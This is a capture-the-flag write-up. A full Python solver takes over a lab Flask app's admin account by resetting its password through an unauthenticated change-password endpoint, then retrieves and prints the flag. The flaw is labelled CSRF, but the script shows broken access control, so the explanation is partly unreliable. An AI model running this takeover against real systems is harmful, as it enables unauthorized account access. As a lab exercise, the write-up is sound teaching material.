# Secret Notes CSRF Exploitation

## Challenge Overview

This challenge involved a Flask-based note-taking application with user authentication and admin functionality. The goal was to exploit a CSRF (Cross-Site Request Forgery) vulnerability to gain admin access and retrieve the flag stored in an admin note.

## Vulnerability Analysis

The application had several security weaknesses:

1. **CSRF in Password Change Functionality**: The `/api/change_password` endpoint lacked CSRF protection, allowing unauthorized password changes
2. **No Current Password Requirement**: The password change didn't require the current password for verification
3. **Admin Credentials Hardcoded**: The admin account was seeded with predictable credentials

## Exploitation Steps

To solve this challenge I've created a python script to automate the process:
```python
#!/usr/bin/env python3
import requests
import time
import sys
import re

class CTFSolver:
    def __init__(self, base_url="http://web-ctf.cyberspace.ma:5501/", verbose=True):
        self.base_url = base_url
        self.session = requests.Session()
        self.verbose = verbose
        # Flag regex pattern for validation
        self.flag_pattern = re.compile(r'CSP{[A-Za-z0-9_]+}')
    
    def log(self, message):
        if self.verbose:
            print(f"[*] {message}")
    
    def register_account(self, username, password):
        self.log(f"Registering new account: {username}")
        data = {
            "username": username,
            "password": password
        }
        response = self.session.post(f"{self.base_url}/register", data=data)
        return response.status_code == 200 and "Registration successful" in response.text
    
    def login(self, username, password):
        self.log(f"Logging in as: {username}")
        data = {
            "username": username,
            "password": password
        }
        response = self.session.post(f"{self.base_url}/login", data=data)
        return response.status_code == 200 and "Login successful" in response.text
    
    def exploit_csrf(self, target_username, new_password):
        self.log(f"Exploiting CSRF vulnerability to change {target_username}'s password")
        data = {
            "username": target_username,
            "new_password": new_password
        }
        response = self.session.post(f"{self.base_url}/api/change_password", data=data)
        
        if response.status_code == 200 and response.json().get('success'):
            self.log(f"✅ Password change successful for {target_username}!")
            return True
        else:
            self.log(f"❌ Password change failed: {response.text}")
            return False
    
    def get_admin_notes(self):
        self.log("Accessing admin notes page")
        response = self.session.get(f"{self.base_url}/admin/notes")
        
        if response.status_code != 200 or "Admin Panel" not in response.text:
            self.log("❌ Failed to access admin notes page")
            return None
        
        match = self.flag_pattern.search(response.text)
        if match:
            flag = match.group(0)
            self.log(f"🚩 Found flag: {flag}")
            return flag
        else:
            self.log("❌ Could not find flag in admin notes")
            return None
    
    def solve(self):
        print("🚀 Starting automated solver for Secret Notes CSRF Challenge")
        print("=" * 60)
        
        if not self.register_account("attacker", "attacker123"):
            print("❌ Failed to register attacker account")
            return False
        
        self.session.get(f"{self.base_url}/logout")
        
        if not self.exploit_csrf("admin", "hacked"):
            print("❌ CSRF exploitation failed")
            return False
        
        if not self.login("admin", "hacked"):
            print("❌ Failed to login as admin")
            return False
        
        flag = self.get_admin_notes()
        
        if flag:
            print("=" * 60)
            print(f"🎉 Challenge solved! Flag: {flag}")
            return True
        else:
            print("=" * 60)
            print("❌ Failed to solve the challenge")
            return False

def main():
    # Check for custom base URL
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://web-ctf.cyberspace.ma:5501/"
    
    solver = CTFSolver(base_url=base_url)
    solver.solve()

if __name__ == "__main__":
    main()
```
### Step 1: Registration
The solver first registered a new account ("attacker") to establish a valid session:
```python
def register_account(self, username, password):
    self.log(f"Registering new account: {username}")
    data = {
        "username": username,
        "password": password
    }
    response = self.session.post(f"{self.base_url}/register", data=data)
```

### Step 2: CSRF Exploitation
The solver then exploited the CSRF vulnerability to change the admin's password without needing their current credentials:
```python
def exploit_csrf(self, target_username, new_password):
    self.log(f"Exploiting CSRF vulnerability to change {target_username}'s password")
    data = {
        "username": target_username,
        "new_password": new_password
    }
    response = self.session.post(f"{self.base_url}/api/change_password", data=data)
```

### Step 3: Admin Login
With the admin password changed, the solver logged in as admin:
```python
def login(self, username, password):
    self.log(f"Logging in as: {username}")
    data = {
        "username": username,
        "password": password
    }
    response = self.session.post(f"{self.base_url}/login", data=data)
```

### Step 4: Flag Retrieval
Finally, the solver accessed the admin notes page to retrieve the flag:
```python
def get_admin_notes(self):
    self.log("Accessing admin notes page")
    response = self.session.get(f"{self.base_url}/admin/notes")
    match = self.flag_pattern.search(response.text)
```

## Technical Details

The exploit worked because:
1. The password change endpoint didn't verify the request origin
2. The same session could be used to make requests on behalf of other users
3. No CSRF tokens were required for state-changing operations

The flag is: `CSP{Cl13nt_S1d3_Ar3_1ntr3sst1ng_P4rt_0f_W3b_P3nt3st1ng}`
